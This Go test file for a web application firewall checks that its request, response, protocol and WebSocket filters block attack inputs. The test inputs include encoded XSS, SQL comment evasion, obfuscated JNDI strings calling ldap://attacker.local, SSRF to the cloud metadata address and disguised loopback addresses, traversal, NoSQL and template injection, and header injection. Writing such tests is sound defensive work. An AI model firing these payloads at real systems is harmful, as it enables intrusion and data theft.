package waf

import (
	"bytes"
	"compress/gzip"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestCheckRequestDetectsEncodedXSS(t *testing.T) {
	r := httptest.NewRequest("GET", "/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected encoded XSS to be blocked")
	}
	if !strings.Contains(details, "XSS") {
		t.Fatalf("expected XSS details, got %q", details)
	}
}

func TestCheckRequestDetectsSQLCommentEvasion(t *testing.T) {
	r := httptest.NewRequest("GET", "/items?id=1+UN/**/ION+SEL/**/ECT+password+FROM+users", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected SQLi comment evasion to be blocked")
	}
	if !strings.Contains(details, "SQLi") {
		t.Fatalf("expected SQLi details, got %q", details)
	}
}

func TestCheckRequestDetectsHeaderJNDI(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.local/a}")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected JNDI payload in header to be blocked")
	}
	if !strings.Contains(details, "JNDI") {
		t.Fatalf("expected JNDI details, got %q", details)
	}
}

func TestCheckRequestDetectsAuthorizationHeaderPayload(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("Authorization", "Bearer ${jndi:ldap://attacker.local/a}")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected payload in Authorization header to be blocked")
	}
	if !strings.Contains(details, "JNDI") {
		t.Fatalf("expected JNDI details, got %q", details)
	}
}

func TestCheckRequestDetectsSSRFMetadataTarget(t *testing.T) {
	r := httptest.NewRequest("POST", "/fetch", nil)
	body := []byte("url=http://169.254.169.254/latest/meta-data/")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected SSRF metadata target to be blocked")
	}
	if !strings.Contains(details, "SSRF") {
		t.Fatalf("expected SSRF details, got %q", details)
	}
}

func TestCheckRequestDetectsPrivateIPv6SSRF(t *testing.T) {
	r := httptest.NewRequest("POST", "/fetch", nil)
	body := []byte("url=http://[fc00::10]/admin")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected private IPv6 SSRF target to be blocked")
	}
	if !strings.Contains(details, "SSRF") {
		t.Fatalf("expected SSRF details, got %q", details)
	}
}

func TestCheckRequestDetectsSingleTraversal(t *testing.T) {
	r := httptest.NewRequest("GET", "/files/../config.php", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected single path traversal to be blocked")
	}
	if !strings.Contains(details, "PATH_TRAVERSAL") {
		t.Fatalf("expected PATH_TRAVERSAL details, got %q", details)
	}
}

func TestCheckRequestDetectsNoSQLInjection(t *testing.T) {
	r := httptest.NewRequest("POST", "/users", nil)
	body := []byte(`{"role":{"$ne":"user"},"$where":"this.password.length > 0"}`)

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected NoSQL injection to be blocked")
	}
	if !strings.Contains(details, "NoSQLi") {
		t.Fatalf("expected NoSQLi details, got %q", details)
	}
}

func TestCheckRequestDetectsSSTI(t *testing.T) {
	r := httptest.NewRequest("GET", "/render?tpl=%7B%7B7*7%7D%7D", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected SSTI payload to be blocked")
	}
	if !strings.Contains(details, "SSTI") {
		t.Fatalf("expected SSTI details, got %q", details)
	}
}

func TestCheckRequestDetectsPrototypePollution(t *testing.T) {
	r := httptest.NewRequest("POST", "/settings", nil)
	body := []byte(`{"__proto__":{"admin":true}}`)

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected prototype pollution payload to be blocked")
	}
	if !strings.Contains(details, "PROTOTYPE_POLLUTION") {
		t.Fatalf("expected PROTOTYPE_POLLUTION details, got %q", details)
	}
}

func TestCheckRequestDetectsOpenRedirect(t *testing.T) {
	r := httptest.NewRequest("GET", "/login?next=https://evil.example", nil)

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected open redirect payload to be blocked")
	}
	if !strings.Contains(details, "OPEN_REDIRECT") {
		t.Fatalf("expected OPEN_REDIRECT details, got %q", details)
	}
}

func TestCheckRequestDetectsHeaderInjection(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("X-Test", "safe\r\nSet-Cookie: injected=true")

	malicious, details, _ := CheckRequest(r, nil)
	if !malicious {
		t.Fatalf("expected header injection payload to be blocked")
	}
	if !strings.Contains(details, "HTTP_HEADER_INJECTION") {
		t.Fatalf("expected HTTP_HEADER_INJECTION details, got %q", details)
	}
}

func TestCheckRequestDetectsMultipartPayload(t *testing.T) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	field, err := writer.CreateFormField("comment")
	if err != nil {
		t.Fatalf("unexpected multipart field error: %v", err)
	}
	if _, err := field.Write([]byte("<script>alert(1)</script>")); err != nil {
		t.Fatalf("unexpected multipart write error: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("unexpected multipart close error: %v", err)
	}

	r := httptest.NewRequest("POST", "/upload", nil)
	r.Header.Set("Content-Type", writer.FormDataContentType())

	malicious, details, _ := CheckRequest(r, body.Bytes())
	if !malicious {
		t.Fatalf("expected multipart payload to be blocked")
	}
	if !strings.Contains(details, "XSS") {
		t.Fatalf("expected XSS details, got %q", details)
	}
}

func TestCheckRequestBlocksMalformedMultipart(t *testing.T) {
	body := []byte("--broken\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\nabc\r\n--different--\r\n")
	r := httptest.NewRequest("POST", "/upload", nil)
	r.Header.Set("Content-Type", "multipart/form-data; boundary=broken")

	malicious, details, _ := CheckRequest(r, body)
	if !malicious {
		t.Fatalf("expected malformed multipart to be blocked")
	}
	if !strings.Contains(details, "MULTIPART") {
		t.Fatalf("expected multipart error details, got %q", details)
	}
}

func TestCheckResponseDetectsSQLLeak(t *testing.T) {
	r := httptest.NewRequest("GET", "/items", nil)
	resp := httptest.NewRecorder().Result()
	resp.Request = r

	body := []byte("SQLSTATE[42000]: syntax error near 'DROP'")
	malicious, details, _ := CheckResponse(resp, body)
	if !malicious {
		t.Fatalf("expected SQL error leak to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_SQL_ERROR") {
		t.Fatalf("expected RESPONSE_SQL_ERROR details, got %q", details)
	}
}

func TestCheckResponseDetectsStackTrace(t *testing.T) {
	body := []byte("Traceback (most recent call last):\n  File \"app.py\", line 1")
	malicious, details, _ := CheckResponse(nil, body)
	if !malicious {
		t.Fatalf("expected stack trace leak to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_STACK_TRACE") {
		t.Fatalf("expected RESPONSE_STACK_TRACE details, got %q", details)
	}
}

func TestCheckResponseDetectsActiveXSSPattern(t *testing.T) {
	body := []byte(`<html><script>alert(1)</script></html>`)
	malicious, details, _ := CheckResponse(nil, body)
	if !malicious {
		t.Fatalf("expected active XSS pattern to be blocked")
	}
	if !strings.Contains(details, "RESPONSE_XSS_PATTERN") {
		t.Fatalf("expected RESPONSE_XSS_PATTERN details, got %q", details)
	}
}

func TestCheckRequestAllowsNormalRequest(t *testing.T) {
	r := httptest.NewRequest("POST", "/profile?tab=settings", nil)
	body := []byte("name=Maria&note=regular+update")

	malicious, details, _ := CheckRequest(r, body)
	if malicious {
		t.Fatalf("expected normal request to pass, got %q", details)
	}
}

func TestCheckRequestDetectsNumericSSRFVariants(t *testing.T) {
	for _, target := range []string{
		"http://2130706433/admin",
		"http://0x7f000001/admin",
		"http://0177.0.0.1/admin",
		"http://127.1/admin",
		"http://[::ffff:127.0.0.1]/admin",
	} {
		t.Run(target, func(t *testing.T) {
			r := httptest.NewRequest(http.MethodPost, "/fetch", nil)
			body := []byte(`{"url":"` + target + `"}`)
			malicious, details, _ := CheckRequest(r, body)
			if !malicious || !strings.Contains(details, "SSRF") {
				t.Fatalf("expected numeric SSRF target to be blocked, got malicious=%v details=%q", malicious, details)
			}
		})
	}
}

func TestCheckRequestInspectsDecodedJSONStrings(t *testing.T) {
	r := httptest.NewRequest(http.MethodPost, "/fetch", nil)
	r.Header.Set("Content-Type", "application/json")
	body := []byte(`{"url":"http:\/\/2130706433\/admin"}`)

	malicious, details, _ := CheckRequest(r, body)
	if !malicious || !strings.Contains(details, "SSRF") {
		t.Fatalf("expected escaped JSON SSRF target to be blocked, got malicious=%v details=%q", malicious, details)
	}
}

func TestCheckRequestRejectsMalformedJSON(t *testing.T) {
	r := httptest.NewRequest(http.MethodPost, "/api", nil)
	r.Header.Set("Content-Type", "application/json")

	malicious, details, _ := CheckRequest(r, []byte(`{"name":`))
	if !malicious || details != "MALFORMED_JSON in Body" {
		t.Fatalf("expected malformed JSON to be rejected, got malicious=%v details=%q", malicious, details)
	}
}

func TestCheckRequestRejectsDuplicateJSONKeys(t *testing.T) {
	req := httptest.NewRequest(http.MethodPost, "http://example.com/api", nil)
	req.Header.Set("Content-Type", "application/json")

	malicious, details, rule := CheckRequest(req, []byte(`{"role":"user","role":"admin"}`))
	if !malicious || details != "DUPLICATE_JSON_KEY in Body" || rule != "BODY-018" {
		t.Fatalf("expected duplicate JSON key rejection, got malicious=%v details=%q rule=%q", malicious, details, rule)
	}
}

func TestDecodeBodyForInspectionHandlesGzip(t *testing.T) {
	var compressed bytes.Buffer
	writer := gzip.NewWriter(&compressed)
	if _, err := writer.Write([]byte(`<script>alert(1)</script>`)); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}

	decoded, violation := DecodeBodyForInspection("gzip", compressed.Bytes(), 1024)
	if violation != nil {
		t.Fatalf("unexpected violation: %+v", violation)
	}
	if string(decoded) != `<script>alert(1)</script>` {
		t.Fatalf("unexpected decoded body: %q", decoded)
	}
}

func TestDecodeBodyForInspectionRejectsExpansionPastLimit(t *testing.T) {
	var compressed bytes.Buffer
	writer := gzip.NewWriter(&compressed)
	_, _ = writer.Write(bytes.Repeat([]byte("A"), 2048))
	_ = writer.Close()

	_, violation := DecodeBodyForInspection("gzip", compressed.Bytes(), 128)
	if violation == nil || violation.Details != "DECODED_BODY_TOO_LARGE in Body" {
		t.Fatalf("expected decompression limit violation, got %+v", violation)
	}
}

func TestCheckProtocolRejectsAmbiguousMetadata(t *testing.T) {
	r := httptest.NewRequest(http.MethodPost, "http://example.test/", nil)
	r.Header.Add("Content-Type", "application/json")
	r.Header.Add("Content-Type", "text/plain")

	violation := CheckProtocol(r, ProtocolLimits{MaxURLLength: 8192, MaxHeaderBytes: 65536, MaxHeaderCount: 100})
	if violation == nil || violation.Rule != "PROTO-008" {
		t.Fatalf("expected duplicate singleton header violation, got %+v", violation)
	}
}

func TestCheckProtocolRejectsNonWebSocketUpgrade(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "http://example.com/", nil)
	req.Header.Set("Connection", "upgrade")
	req.Header.Set("Upgrade", "h2c")

	violation := CheckProtocol(req, ProtocolLimits{})
	if violation == nil || violation.Rule != "PROTO-014" {
		t.Fatalf("expected non-WebSocket upgrade rejection, got %+v", violation)
	}
}

func TestCheckProtocolRejectsWebSocketHandshakeBody(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "http://example.com/", strings.NewReader("unexpected"))
	req.Header.Set("Connection", "upgrade")
	req.Header.Set("Upgrade", "websocket")

	violation := CheckProtocol(req, ProtocolLimits{})
	if violation == nil || violation.Rule != "PROTO-015" {
		t.Fatalf("expected WebSocket body rejection, got %+v", violation)
	}
}

func TestCheckWebSocketMessagesUsesDirectionSpecificRules(t *testing.T) {
	if malicious, details, _ := CheckWebSocketClientMessage([]byte(`<script>alert(1)</script>`)); !malicious || !strings.Contains(details, "WebSocket Message") {
		t.Fatalf("expected client message XSS detection, got malicious=%v details=%q", malicious, details)
	}
	if malicious, _, _ := CheckWebSocketServerMessage([]byte("root:x:0:0:root:/root:/bin/bash"), false, false); !malicious {
		t.Fatal("expected high-signal server file leak detection")
	}
	if malicious, _, _ := CheckWebSocketServerMessage([]byte("SQLSTATE[42000]: syntax error"), false, false); malicious {
		t.Fatal("expected WebSocket diagnostics to remain quiet under the error-only default")
	}
	if malicious, _, _ := CheckWebSocketServerMessage([]byte("SQLSTATE[42000]: syntax error"), false, true); !malicious {
		t.Fatal("expected explicit WebSocket diagnostics to detect SQL disclosure")
	}
}

func TestResponsePolicyAvoidsBlockingDocumentationPages(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/instructions", nil)
	resp := httptest.NewRecorder().Result()
	resp.Request = r
	body := []byte(`Documentation example: SQLSTATE[42000] and <script>alert(1)</script>`)

	malicious, details, _ := CheckResponseWithOptions(resp, body, ResponseOptions{
		DetectActiveXSS:         false,
		DiagnosticsOnErrorsOnly: true,
	})
	if malicious {
		t.Fatalf("expected a successful documentation page to pass, got %q", details)
	}
}
